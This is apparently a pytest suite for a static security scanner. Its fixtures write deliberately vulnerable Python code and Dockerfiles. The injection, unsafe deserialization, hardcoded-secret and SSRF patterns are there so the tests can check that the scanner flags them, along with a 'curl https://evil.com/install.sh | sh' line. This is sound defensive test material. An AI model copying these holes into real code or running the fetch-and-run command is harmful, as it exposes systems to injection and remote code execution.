
import pytest

from security_platform.analysis.orchestrator import ScanOrchestrator
from security_platform.taxonomy.categories import Category
from security_platform.taxonomy.vulnerability_types import VulnerabilityType


@pytest.fixture
def orchestrator():
    return ScanOrchestrator()


def test_master_prompt_vulnerabilities_detected(orchestrator, tmp_path):
    """
    Benchmark test from the Master Prompt:
    Ensures that a file containing:
      - subprocess.run(cmd, shell=True) fed from request.args
      - os.system('ls ' + x)
      - SQL string concatenation into cursor().execute
      - pickle.loads
      - yaml.load
      - hashlib.new('md5')
      - hardcoded password = '...'
    detects ALL of these vulnerabilities (previously 0 were detected).
    """
    vulnerable_code = """
import os
import subprocess
import pickle
import yaml
import hashlib
from flask import request

def handler():
    # 1. fed from request.args into subprocess.run with shell=True
    user_cmd = request.args.get("cmd")
    subprocess.run(user_cmd, shell=True)

    # 2. os.system with concatenation
    x = request.args.get("file")
    os.system("ls " + x)

    # 3. SQL string concatenation into db.cursor().execute
    user_id = request.args.get("id")
    query = "SELECT * FROM users WHERE id = '" + user_id + "'"
    cursor().execute(query)

    # 4. Insecure deserialization: pickle.loads
    raw_data = request.args.get("data")
    pickle.loads(raw_data)

    # 5. Insecure deserialization: yaml.load without SafeLoader
    yaml.load(raw_data)

    # 6. Weak crypto: hashlib.new('md5')
    hashlib.new("md5", b"secret")

    # 7. Hardcoded password
    password = "super_secret_production_password_xyz_123"
"""
    vuln_file = tmp_path / "vulnerable_app.py"
    vuln_file.write_text(vulnerable_code)

    result = orchestrator.run_scan(tmp_path)
    findings = result.findings

    vuln_types = {f.vulnerability_type for f in findings}

    # Verify Command Injection
    assert VulnerabilityType.COMMAND_INJECTION in vuln_types, "Failed to detect command injection"

    # Verify SQL Injection
    assert VulnerabilityType.SQL_INJECTION in vuln_types, "Failed to detect SQL injection"

    # Verify Insecure Deserialization
    assert (
        VulnerabilityType.INSECURE_DESERIALIZATION in vuln_types
        or VulnerabilityType.UNSAFE_DESERIALIZATION in vuln_types
    ), "Failed to detect insecure deserialization"

    # Verify Weak Cryptography
    assert VulnerabilityType.INSECURE_CRYPTOGRAPHY in vuln_types, "Failed to detect weak crypto"

    # Verify Hardcoded Password / Secret
    assert (
        VulnerabilityType.PASSWORD in vuln_types
        or VulnerabilityType.HARDCODED_SECRET in vuln_types
    ), "Failed to detect hardcoded password"

    # Should detect at least 6-7 distinct findings
    assert len(findings) >= 6, f"Expected at least 6 findings, found {len(findings)}"


def test_aliased_imports_resolved(orchestrator, tmp_path):
    """D1: Aliased imports (import subprocess as sp; from os import system) must be resolved."""
    code = """
import subprocess as sp
from os import system as sys_exec

def run(request):
    cmd = request.args.get("cmd")
    sp.run(cmd, shell=True)
    sys_exec("cat " + cmd)
"""
    (tmp_path / "aliased.py").write_text(code)
    result = orchestrator.run_scan(tmp_path)
    cmd_findings = [f for f in result.findings if f.vulnerability_type == VulnerabilityType.COMMAND_INJECTION]
    assert len(cmd_findings) >= 2, f"Expected >= 2 findings from aliased calls, found {len(cmd_findings)}"


def test_sink_specific_sanitizers(orchestrator, tmp_path):
    """
    D4: Sanitizers must be sink-specific.
    shlex.quote sanitizes shell commands, but DOES NOT sanitize SQL injection.
    int() sanitizes SQL numbers, but NOT shell injection.
    """
    code = """
import shlex
import os
import sqlite3

def test_sanitizer_behavior(request):
    raw_input = request.args.get("input")

    # shlex.quote is safe for shell:
    safe_shell = shlex.quote(raw_input)
    os.system(safe_shell)

    # BUT shlex.quote is NOT safe for SQL:
    sql_with_shlex = f"SELECT * FROM items WHERE name = '{safe_shell}'"
    sqlite3.execute(sql_with_shlex)
"""
    (tmp_path / "sanitizers.py").write_text(code)
    result = orchestrator.run_scan(tmp_path)

    # os.system(safe_shell) should NOT have command injection
    cmd_findings = [f for f in result.findings if f.vulnerability_type == VulnerabilityType.COMMAND_INJECTION]
    assert len(cmd_findings) == 0, "shlex.quote failed to sanitize shell command"

    # sqlite3.execute(sql_with_shlex) MUST be flagged as SQL injection
    sql_findings = [f for f in result.findings if f.vulnerability_type == VulnerabilityType.SQL_INJECTION]
    assert len(sql_findings) >= 1, "shlex.quote incorrectly sanitized SQL sink"


def test_context_aware_crypto_usedforsecurity(orchestrator, tmp_path):
    """
    D5: hashlib.md5 with usedforsecurity=False should NOT be flagged as High severity security flaw.
    """
    code = """
import hashlib

def non_security_checksum(content):
    # Non-security use (e.g. cache key / file hash)
    return hashlib.md5(content, usedforsecurity=False).hexdigest()
"""
    (tmp_path / "checksum.py").write_text(code)
    result = orchestrator.run_scan(tmp_path)

    # Should either not be flagged or be at most INFO severity
    crypto_findings = [f for f in result.findings if f.vulnerability_type == VulnerabilityType.INSECURE_CRYPTOGRAPHY]
    assert len(crypto_findings) == 0 or all(f.severity.value == "INFO" for f in crypto_findings)


def test_inline_suppression_comment(orchestrator, tmp_path):
    """Inline suppression # secorch: ignore[RULE-ID] reason='...' must suppress the finding."""
    code = """
import os

def test_suppressed(request):
    val = request.args.get("x")
    # secorch: ignore[SEC-TAINT-COMMAND_INJECTION-001] reason="verified internal input"
    os.system(val)
"""
    (tmp_path / "suppressed.py").write_text(code)
    result = orchestrator.run_scan(tmp_path)
    assert len(result.findings) == 0, f"Expected 0 findings due to inline suppression, got {len(result.findings)}"


def test_multistage_dockerfile_user_tracking(orchestrator, tmp_path):
    """
    D9: If stage 1 declares USER nonroot, but stage 2 has no USER declaration,
    the final container executes as root and MUST be flagged.
    """
    dockerfile_content = """
FROM python:3.12 AS builder
USER 1000:1000
RUN pip install --user requests

FROM python:3.12-slim
# Final stage starts as root!
COPY --from=builder /root/.local /root/.local
HEALTHCHECK CMD curl -f http://localhost:8000/health || exit 1
CMD ["python", "app.py"]
"""
    (tmp_path / "Dockerfile").write_text(dockerfile_content)
    result = orchestrator.run_scan(tmp_path)
    root_findings = [f for f in result.findings if f.rule_id == "SEC-CFG-ROOT-001"]
    assert len(root_findings) >= 1, "Failed to detect final stage running as root"


def test_dockerfile_security_checks(orchestrator, tmp_path):
    """
    D9: Dockerfile analyzer must flag:
      - Latest/untagged base images
      - ADD from URLs
      - Pipe to shell (curl | sh)
      - Secrets in ENV/ARG
      - Missing HEALTHCHECK
    """
    dockerfile_content = """
FROM alpine:latest
ADD https://example.com/script.sh /tmp/script.sh
RUN curl -fsSL https://evil.com/install.sh | sh
ENV DB_PASSWORD=my_super_secret_db_pass_123
USER appuser
CMD ["app"]
"""
    (tmp_path / "Dockerfile").write_text(dockerfile_content)
    result = orchestrator.run_scan(tmp_path)

    rule_ids = {f.rule_id for f in result.findings}
    assert "SEC-DOCKER-LATEST-001" in rule_ids, "Missing latest base image check"
    assert "SEC-DOCKER-ADD-URL-001" in rule_ids, "Missing remote ADD check"
    assert "SEC-DOCKER-PIPE-SHELL-001" in rule_ids, "Missing curl | sh check"
    assert "SEC-DOCKER-SECRET-001" in rule_ids, "Missing secret in ENV/ARG check"
    assert "SEC-DOCKER-HEALTHCHECK-001" in rule_ids, "Missing HEALTHCHECK check"


def test_sca_dependency_analyzer(orchestrator, tmp_path):
    """D8: SCA checks dependency versions in requirements.txt and matches known CVEs."""
    reqs_content = """
requests==2.25.0
urllib3==1.26.4
pyyaml==5.3
"""
    (tmp_path / "requirements.txt").write_text(reqs_content)
    result = orchestrator.run_scan(tmp_path)

    sca_findings = [f for f in result.findings if f.category == Category.DEPENDENCY]
    assert len(sca_findings) >= 3, f"Expected at least 3 SCA findings, got {len(sca_findings)}"
    assert any("CVE-2023-32681" in f.rule_id for f in sca_findings), "Failed to match requests CVE"
    assert any("CVE-2020-14343" in f.rule_id for f in sca_findings), "Failed to match pyyaml CVE"


def test_cyclonedx_sbom_generation(orchestrator, tmp_path):
    """D8: CycloneDX SBOM generation produces valid specVersion 1.5 JSON."""
    from security_platform.reporting.cyclonedx import CycloneDXExporter

    reqs_content = "requests==2.25.0\nflask==2.0.1\n"
    (tmp_path / "requirements.txt").write_text(reqs_content)
    result = orchestrator.run_scan(tmp_path)

    sbom = CycloneDXExporter.generate_sbom(
        project_name="test-project",
        dependencies=result.dependencies,
        findings=result.findings
    )
    assert sbom["bomFormat"] == "CycloneDX"
    assert sbom["specVersion"] == "1.5"
    assert len(sbom["components"]) >= 2
    assert any(c["name"] == "requests" for c in sbom["components"])


def test_baseline_file_suppression(orchestrator, tmp_path):
    """D7/Phase 3: .secorch-baseline.json suppresses known findings."""
    import json

    code = """
import os

def test_handler(request):
    cmd = request.args.get("cmd")
    os.system(cmd)
"""
    (tmp_path / "app.py").write_text(code)

    # First scan without baseline
    initial_res = orchestrator.run_scan(tmp_path)
    assert len(initial_res.findings) >= 1

    # Write baseline file with the finding's fingerprint
    finding_fp = initial_res.findings[0].get_fingerprint()
    baseline = {"findings": [{"fingerprint": finding_fp, "rule_id": initial_res.findings[0].rule_id}]}
    (tmp_path / ".secorch-baseline.json").write_text(json.dumps(baseline))

    # Second scan with baseline
    second_res = orchestrator.run_scan(tmp_path)
    assert len(second_res.findings) == 0, "Baseline failed to suppress known finding"


def test_per_function_taint_scoping(orchestrator, tmp_path):
    """
    D3: Taint state must not leak across function boundaries.
    Variable 'x' in func1 is tainted; variable 'x' in func2 is safe.
    func2's call to os.system(x) must NOT be flagged.
    """
    code = """
import os
from flask import request

def func1():
    x = request.args.get("untrusted")

def func2():
    x = "echo clean_command"
    os.system(x)
"""
    (tmp_path / "scoping.py").write_text(code)
    result = orchestrator.run_scan(tmp_path)
    cmd_findings = [f for f in result.findings if f.vulnerability_type == VulnerabilityType.COMMAND_INJECTION]
    assert len(cmd_findings) == 0, f"Taint leaked across function boundaries: {cmd_findings}"


def test_ssrf_and_path_traversal_sinks(orchestrator, tmp_path):
    """D2: New rules for SSRF (requests.get) and Path Traversal (open)."""
    code = """
import requests
from flask import request

def handler():
    target_url = request.args.get("url")
    requests.get(target_url)

    file_to_read = request.args.get("path")
    open(file_to_read, "r")
"""
    (tmp_path / "sinks.py").write_text(code)
    result = orchestrator.run_scan(tmp_path)
    vuln_types = {f.vulnerability_type for f in result.findings}
    assert VulnerabilityType.SSRF in vuln_types, "Failed to detect SSRF"
    assert VulnerabilityType.PATH_TRAVERSAL in vuln_types, "Failed to detect Path Traversal"
